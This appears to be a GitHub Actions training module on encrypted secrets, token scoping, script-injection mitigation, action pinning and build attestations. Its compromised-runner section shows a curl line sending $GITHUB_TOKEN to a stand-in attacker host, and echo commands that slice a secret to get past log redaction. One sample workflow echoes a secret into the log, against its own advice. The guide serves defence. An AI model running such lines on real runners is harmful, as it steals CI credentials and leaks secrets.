Secrets are encrypted environment variables used to store tokens, credentials, and other types of sensitive information required by your GitHub Actions workflows and actions. Once created, these secrets are available to workflows and actions that have access to the organization, repository, or environment where they are defined.

This section introduces the tools and strategies available in GitHub Enterprise Cloud and GitHub Enterprise Server for managing encrypted secrets. You'll also learn how to access these secrets within your workflows and actions.

## Manage encrypted secrets in the enterprise

GitHub Actions enables you to securely store and use sensitive data—such as API keys, authentication tokens, passwords, and certificates—through **encrypted secrets**. These secrets are safely stored and injected into workflows, ensuring they are not exposed in logs or source code.

In an enterprise setting, effective secret management is essential for maintaining security, meeting compliance requirements, and supporting operational efficiency. GitHub supports secret management at multiple levels: **enterprise**, **organization**, **repository**, and **environment**.

### Scope of encrypted secrets

Understanding the **scope** of secrets is essential for managing them securely in an enterprise environment.

| **Secret Level**               | **Scope**                                                                                                  | **Who Can Access**                             | **Common Use Cases**                                                      |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------------------------------- |
| **Enterprise-Level Secrets**   | Available across all repositories within a GitHub Enterprise Cloud organization.                           | Enterprise owners, security administrators     | Shared API keys or service credentials used across multiple repositories. |
| **Organization-Level Secrets** | Accessible to all repositories within a specific organization. Can be restricted to selected repositories. | Organization owners, security administrators   | Tokens for cloud services or shared database credentials.                 |
| **Repository-Level Secrets**   | Available only to a single repository.                                                                     | Repository administrators and workflow runners | Deployment-specific API keys or database credentials.                     |
| **Environment-Level Secrets**  | Scoped to a particular deployment environment (e.g., staging, production) within a repository.         | Workflow runners in the defined environment    | Credentials needed for environment-specific deployments.                  |

**Key considerations:**
- **Enterprise secrets** are exclusive to GitHub Enterprise Cloud and offer centralized management across an organization.
- **Organization secrets** support fine-grained access control by allowing restriction to specific repositories.
- **Environment secrets** help prevent unintentional exposure of production credentials by limiting access to targeted workflows.

## Manage encrypted secrets at organization level

Creating encrypted secrets at organization level to store sensitive information is a great way to ensure the security of this information, while minimizing management overhead in your enterprise.

For example, some developers writing workflows in your GitHub organization need the credentials to deploy code to production in some of their workflows. In order to avoid sharing this sensitive piece of information, you could create an encrypted secret containing the credentials at organization level. This way the credentials can be used in the workflows without being exposed.

To create a secret at organization level, go to your organization **Settings** and from the sidebar select **Secrets and variables > Actions > New organization secret**. In the screen that appears, enter a name and a value and choose a repository access policy for your secret:

:::image type="content" source="../media/add-org-secret.png" alt-text="New secret screen for organizations.":::

Once saved, the access policy is displayed below the secret in the list:

:::image type="content" source="../media/secret-access-policy.png" alt-text="Encrypted secrets example with access policy displayed.":::

You can select **Update** for more details on the configured permissions for your secret.

### Manage Organization-Level Encrypted Secrets Via GitHub CLI

- **Create a secret for an organization:**
  ```sh
  gh secret set SECRET_NAME --org my-org --body "super-secret-value"
  ```
- **List all organization secrets:**
  ```sh
  gh secret list --org my-org
  ```
- **Update an existing secret:**
  ```sh
  gh secret set SECRET_NAME --org my-org --body "new-secret-value"
  ```
- **Delete a secret:**
  ```sh
  gh secret delete SECRET_NAME --org my-org
  ```

#### Security considerations for organization secrets

- **Restrict secrets to specific repositories** rather than granting access to all repositories by default.
- **Implement role-based access control (RBAC)** to ensure only authorized team members can create, update, or delete secrets.
- **Monitor access logs regularly** to identify and respond to unauthorized usage or suspicious activity.

## Manage encrypted secrets at the repository level
If you need to scope a secret to a specific repository, GitHub Enterprise Cloud and GitHub Enterprise Server support creating secrets at the repository level.

To create a repository-level secret:

1. Navigate to the repository’s **Settings**.
2. In the sidebar, select **Secrets and variables > Actions > New repository secret**.
3. Enter a name and value for the secret.

:::image type="content" source="../media/secret-repo.png" alt-text="New secret screen for repositories." border="false":::

### Manage Repository-Level Encrypted Secrets via CLI
- **List repository secrets:**
  ```sh
  gh secret list --repo my-repo
  ```
- **Update a repository secret:**
  ```sh
  gh secret set SECRET_NAME --repo my-repo --body "new-secret-value"
  ```
- **Delete a repository secret:**
  ```sh
  gh secret delete SECRET_NAME --repo my-repo
  ```

## Access encrypted secrets within actions and workflows

### In workflows

To access an encrypted secret in a workflow, you must use the `secrets` context in your workflow file. For example:

```yml
steps:
  - name: Hello world action
    with: # Set the secret as an input
      super_secret: ${{ secrets.SuperSecret }}
    env: # Or as an environment variable
      super_secret: ${{ secrets.SuperSecret }}
```

### In actions

To access an encrypted secret in an action, you must specify the secret as an `input` parameter in the `action.yml` metadata file. For example:

```yml
inputs:
  super_secret:
    description: 'My secret token'
    required: true
```

If you need to access the encrypted secret in your action's code, the action code could read the value of the input using the `$SUPER_SECRET` environment variable.

> [!WARNING]
> When creating custom actions, avoid including encrypted secrets directly in the source code, as actions are designed to be shared. To handle secrets or user-supplied inputs securely, use the core module from the [Actions Toolkit](https://github.com/actions/toolkit).

## Configure security hardening for GitHub Actions

Security hardening for GitHub Actions plays a role in keeping your software supply chain secure. The following sections will walk you through recommended practices to strengthen the security of the actions you use in your workflows.

### Identify best practices for mitigating script injection attacks

Some best practices for mitigating script injection attacks on GitHub actions include:

1. *Use javascript actions instead of inline scripts*: Use JavaScript actions that accept context values as arguments instead of embedding those values in inline scripts. This approach reduces the risk of script injection because the context data is not used to generate or execute shell commands directly.

In the example below, passing a variable as an input to a JavaScript action helps prevent it from being used in a script injection attack.

   ```yml
    uses: fakeaction/checktitle@v3
    with:
      title: ${{ github.event.pull_request.title }} 
   ```

2. *Use intermediate environment variables in inline scripts*: When using inline scripts, evaluate variables as environment variables before using them in commands. This ensures the values are resolved before the script runs, reducing the risk of script injection.
For example, using `github.event.pull_request.title` as an environment variable helps protect against injection vulnerabilities:

    ```yml
    - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
    ```
:::image type="content" source="../media/manage-encrypted-secrets_pr.png" alt-text="Screenshot showing a pull request interface related to managing encrypted secrets." border="false":::

:::image type="content" source="../media/manage-encrypted-secrets_workflow.png" alt-text="Screenshot showing a GitHub Actions workflow execution related to encrypted secrets." border="false":::

3. *Leverage workflow templates to implement code scanning*: If you click on the **Actions** tab of any repository, you will be able to select the **New Workflow** button on the left side of the pane. On the **Choose a workflow** page, you'll find a **Security** section where you can select workflow templates to add to your repository. The CodeQL scanner, in particular, can be configured to run on specific events. You can configure it to trigger on an appropriate event to scan a branch's files & flag exposures (CWE's) in actions used within workflows; including vulnerabilities such as script injection.

:::image type="content" source="../media/manage-encrypted-secrets_newworkflow.png" alt-text="Screenshot showing the creation of a new GitHub Actions workflow for managing encrypted secrets." border="false":::

:::image type="content" source="../media/manage-encrypted-secrets_codeql.png" alt-text="Screenshot showing CodeQL configuration related to managing encrypted secrets." border="false":::

4. *Restrict permissions for tokens*: Make sure to always apply the `rule of least privilege` to any created token.  In other words, ensure the token is assigned the minimum privileges to achieve the task for which it was created.

### Best practices for securely using third-party actions

Follow these best practices to safely incorporate third-party actions into your workflows:

1. **Pin actions to a tag only if the author is trusted**
   Use version tags (e.g., `@v4`) only when the action's author is verified and trusted. This helps reduce the risk of unexpected changes in future releases.

   ```yml
   - name: Checkout
     uses: actions/checkout@v4  # Pinned to a specific version tag
   ```

2. **Prefer pinning actions to a full commit SHA**
   Pinning to a full commit SHA ensures you're using an immutable version of the action. Always verify that the commit SHA comes from the expected repository.

   ```yml
   - name: Checkout
     uses: actions/checkout@1e31de5234b9f8995739874a8ce0492dc87873e2  # Pinned to a specific commit SHA
   ```

3. **Audit the action’s source code**
   Review the action’s source to confirm it handles data securely and does not include unexpected or malicious behavior.

### Indicators of a trustworthy third-party action

You should have situational awareness of indicators of a trustworthy third-party action to be better able to manage risk.  The action should appear on the Github Marketplace. When you view the action's entry in the GitHub Marketplace, ensure that it shows the 'Verified creator' badge to the right of the title (highlighted red in the image below).  This indicates that the vendor has been verified by GitHub.  In addition, the `action.yml` file defining the action should be well documented.

:::image type="content" source="../media/manage-encrypted-secrets_marketplace.png" alt-text="Screenshot showing the GitHub Marketplace interface for managing encrypted secrets." border="false":::

### Use Dependabot version updates to keep actions up to date

Enable Dependabot version updates to automatically keep your GitHub Actions dependencies current and secure.

### Potential impact of a compromised runner

The following sections describe possible attack vectors that could be exploited if a runner is compromised.

#### Exfiltration of data from a runner

While GitHub Actions automatically redact secrets from logs, this redaction is not a complete security boundary. If a runner is compromised, an attacker can intentionally expose secrets by printing them to the log. For example:

```yml
echo ${SOME_SECRET:0:4}
echo ${SOME_SECRET:4:200}
```

A compromised runner can also be used to forward secrets or other sensitive repository data to an external server using scripted HTTP requests.

#### Access to secrets

Workflows triggered from forked repositories using the `pull_request` event have read-only permissions and cannot access secrets. However, permissions vary depending on the event type—such as `issue_comment`, `issues`, `push`, or `pull_request` from a branch within the same repository. If a runner is compromised, there is a risk that repository secrets could be exposed or that a job’s `GITHUB_TOKEN` with write permissions could be misused.

* If a secret or token is assigned to an environment variable, it can be accessed directly using `printenv`.
* If a secret is referenced directly in an expression, the generated shell script containing the resolved value is stored on disk and may be accessible.
* For custom actions, the level of risk depends on how the secret is handled within the action’s logic. For example:

```yml
uses: exampleaction/publish@v3
with:
  key: ${{ secrets.PUBLISH_KEY }}
```

Although GitHub Actions removes secrets from memory if they are not referenced in the workflow or included actions, the `GITHUB_TOKEN` and any actively used secrets remain at risk of being harvested if the runner is compromised.

#### Stealing a job's `GITHUB_TOKEN`

An attacker may be able to steal a job's `GITHUB_TOKEN`. GitHub Actions automatically provides this token with scoped permissions limited to the repository running the workflow. The token expires once the job completes and cannot be reused afterward.

However, a compromised runner can be used to exfiltrate the token immediately during the job’s execution. An attacker can automate a request to a server they control to capture the token before it expires. For example:

```yml
curl http://example.com?token=$GITHUB_TOKEN
```

#### Modification of repository contents

If a `GITHUB_TOKEN` is stolen, an attacker-controlled system can use it to call the GitHub API and modify repository content.

Applying the principle of least privilege to the token’s permissions helps reduce this risk. Limit the token's access to only what is necessary for the job.

### Managing cross-repository access

When workflows require access to multiple repositories, it's important to choose credentials that minimize security risks. Below are the recommended options, listed from most to least preferred.

1. **`GITHUB_TOKEN`**

The `GITHUB_TOKEN` is automatically generated by GitHub for each workflow run. It is scoped to the single repository that triggers the workflow and provides permissions equivalent to a write-access user on that repository. The token is created at the start of each job and expires when the job completes.

Use the `GITHUB_TOKEN` whenever possible for secure and scoped authentication.
For details, see [Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication).

2. **Repository deploy key**

Deploy keys provide read or write access to a single repository and can be used within workflows to clone or push using Git.

However, deploy keys do not support access to GitHub's REST or GraphQL APIs. Use them only when API access is not required and Git access is sufficient.

3. **GitHub App tokens**

GitHub Apps offer fine-grained permissions and can be installed on selected repositories. You can create an internal GitHub App, install it on the necessary repositories, and authenticate as the app installation within your workflow to access those repositories.

This approach provides better access control and auditing compared to personal tokens.

4. **Personal access tokens (PATs)**

Avoid using classic personal access tokens in workflows. These tokens grant broad access across all personal and organizational repositories associated with the user, introducing significant risk. If the workflow runs in a repository with multiple contributors, all write-access users effectively inherit that token’s privileges.

If you must use a personal token, create a **fine-grained PAT** tied to a dedicated organizational account. Restrict its access to only the specific repositories required by the workflow.
Note: This approach is difficult to scale and is best avoided in favor of deploy keys or GitHub Apps.

:::image type="content" source="../media/manage-encrypted-secrets\_personalaccesstoken.png" alt-text="Screenshot showing a button to generate new GitHub personal access token." border="false":::

5. **SSH keys on personal accounts**

Never use SSH keys from personal accounts in workflows. Like classic PATs, they grant access to all repositories associated with the account, including personal and organizational repositories. This exposes workflows to unnecessary risk.

If your use case involves cloning or pushing via Git, consider using deploy keys instead. They provide scoped access without exposing unrelated repositories or requiring personal credentials.

### Audit GitHub Action events

The type of action, when it was run, and which personal account performed the action are recorded in the 'security log' and the 'audit log'.  The 'security log' records events related to your user account.  The 'audit log' records events related to your organization.  Thus by viewing both of these logs you can audit events related to github actions.

### Using OIDC with GitHub Actions

You can configure workflows to authenticate directly with a cloud provider using OIDC (OpenID Connect). In this case, there is no longer the need to store credentials as secrets.  

### Artifact attestions for GitHub Actions

Artifact attestations help establish the provenance of builds, improving software supply chain security by verifying what was built, where, and how.

#### What to attest

With GitHub Actions, you can attest to build provenance & SBOM's for binaries and container images.

#### Generating artifact attestations for builds

When you generate an artifact attestation for builds you must ensure:

* You have the appropriate permissions configured in the workflow
* You have included a step in your workflow that uses the  [attest-build-provenance](https://github.com/actions/attest-build-provenance) action.

The attestation establishes build provenance. You can view attestations in the repository's **Actions** tab. 

:::image type="content" source="../media/manage-encrypted-secrets_attestations.png" alt-text="Screenshot showing attestations configuration in GitHub related to managing encrypted secrets." border="false":::

##### Generating an attestation for build provenance of binaries

1. You must add the following permissions to the workflow that builds the binary for which you intend to attest:
   ```yml
      permissions:
       id-token: write
       contents: read
       attestations: write
   ```
   
2. You must add the following step after the step where the binary is built:
    ```yml
      - name: Generate artifact attestation
        uses: actions/attest-build-provenance@v2
        with:
         subject-path: 'PATH/TO/ARTIFACT'
     ```

Note that the value of the `subject-path` parameter should be set to the path to the binary you will attest.

##### Generating an attestation for the build provenance of container images

1. Add the following permissions to the workflow that builds the container image:

   ```yml
   permissions:
     id-token: write
     contents: read
     attestations: write
     packages: write
   ```

2. Add this step after the container image has been built:

   ```yml
   - name: Generate artifact attestation
     uses: actions/attest-build-provenance@v2
     with:
       subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
       subject-digest: 'sha256:fedcba0...'
       push-to-registry: true
   ```

> * The `subject-name` value must be a fully qualified image name, such as `ghcr.io/user/app` or `acme.azurecr.io/user/app`. Do **not** include a tag.
> * The `subject-digest` must be a SHA256 digest of the image, in the format `sha256:HEX_DIGEST`.
> * If your workflow uses `docker/build-push-action`, you can retrieve the digest from its output. For details, refer to [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idoutputs).

#### Generating attestations for SBOMs

You have the ability to generate SBOM attestions for an SBOM.  To generate and attest to an SBOM you must perform the following:

*  Ensure you have set the appropriate permissions in the workflow (see examples below).
*  You must generate an SBOM for the artifact in a step in the workflow.  For an example, see anchore-sbom-action in the GitHub Marketplace.
*  Include a step in your workflow that uses the attest-sbom action (see examples below)

##### Generating an SBOM attestation for binaries

1. Add the following permissions to the workflow that builds the binary for which you will generate an SBOM attestation:
   ```yml
       permissions:
        id-token: write
        contents: read
        attestations: write
   ```
   
2. Add the following step after the steps where the binary is built and SBOM generated:
    ```yml
        - name: Generate SBOM attestation
        uses: actions/attest-sbom@v1
        with:
          subject-path: 'PATH/TO/ARTIFACT'
          sbom-path: 'PATH/TO/SBOM'
    ```

Note that the value of the `subject-path` parameter should be set to the path of the binary the SBOM describes. The value of the `sbom-path` parameter should be set to the path of the SBOM file you generated.

##### Generating an SBOM attestation for container images

1. You must add the following permissions to the workflow that builds the binary for which you will generate an SBOM attestation:
   
    ```yml
       permissions:
        id-token: write
        contents: read
        attestations: write
        packages: write
    ```
    
2. You must add the following step after the steps where the binary is built and SBOM generated:
   
    ```yml
        - name: Generate SBOM attestation
        uses: actions/attest-sbom@v1
        with:
          subject-name: ${{ env.REGISTRY }}/PATH/TO/IMAGE
          subject-digest: 'sha256:fedcba0...'
          sbom-path: 'sbom.json'
          push-to-registry: true
    ```

Note that the value of the `subject-name` parameter specifies the fully-qualified image name. For example, `ghcr.io/user/app` or `acme.azurecr.io/user/app`. Do not include a tag as part of the image name.

The value of the `subject-digest` parameter should be set to the `SHA256` digest of the subject for the attestation, in the form's `sha256:HEX_DIGEST`. If your workflow uses `docker/build-push-action`, you can use the digest output from that step to supply the value (see [build-push-action](https://github.com/docker/build-push-action?tab=readme-ov-file#outputs)). For more information on using outputs, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idoutputs).

The value of the `sbom-path` parameter should be set to the path to the JSON-formatted SBOM file for which you intend to attest.
    
#### Verifying artifact attestations with the GitHub CLI

You can validate the artifact attestations outlined above using the GitHub CLI.  For more information, see the [attestation section](https://cli.github.com/manual/gh_attestation) of the GitHub CLI manual.

> [!WARNING]
> It is important to remember that artifact attestations are not a guarantee that an artifact is secure. Instead, artifact attestations link you to the source code and the build instructions that produced them. It is up to you to define your policy criteria, evaluate that policy by evaluating the content, and make an informed risk decision when you are consuming software.
>

### Access encrypted secrets within actions and workflows

#### Example: Using a Secret in a Workflow

```yaml
name: Deploy Application

on:
  push:
    branches:
      - main

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Use secret in a script
        run: echo "Deploying with API_KEY=${{ secrets.DEPLOYMENT_KEY }}"
```

#### Best practices for using secrets in workflows
- **Do not print secrets** in logs using `echo ${{ secrets.SECRET_NAME }}`.
- **Use secrets within script commands**, rather than assigning them to environment variables.
- **Limit access** by defining secrets at the **lowest necessary level**.
- **Rotate secrets periodically** and update workflows accordingly.

## How to use third party vaults

Many enterprises integrate GitHub Actions with external secret management solutions like **HashiCorp Vault, AWS Secrets Manager, and Azure Key Vault**.

### 1. HashiCorp Vault
```yaml
- name: Fetch secret from Vault
  id: vault
  uses: hashicorp/vault-action@v2
  with:
    url: https://vault.example.com
    token: ${{ secrets.VAULT_TOKEN }}
    secret: secret/data/github/my-secret
```

### 2. AWS Secrets Manager
```yaml
- name: Retrieve AWS Secret
  run: |
    SECRET_VALUE=$(aws secretsmanager get-secret-value --secret-id my-secret | jq -r .SecretString)
    echo "SECRET_VALUE=${SECRET_VALUE}" >> $GITHUB_ENV
```

### 3. Azure Key Vault
```yaml
- name: Retrieve Azure Secret
  uses: Azure/get-keyvault-secrets@v1
  with:
    keyvault: "my-keyvault"
    secrets: "my-secret"
    azureCredentials: ${{ secrets.AZURE_CREDENTIALS }}
```

### Benefits of using third-Party vaults
- **Centralized secret management** reduces security risks.  
- **Automated secret rotation** helps comply with security policies.  
- **Audit logs and access control** enhance security monitoring.  
- **Least privilege access** prevents unauthorized use of secrets.

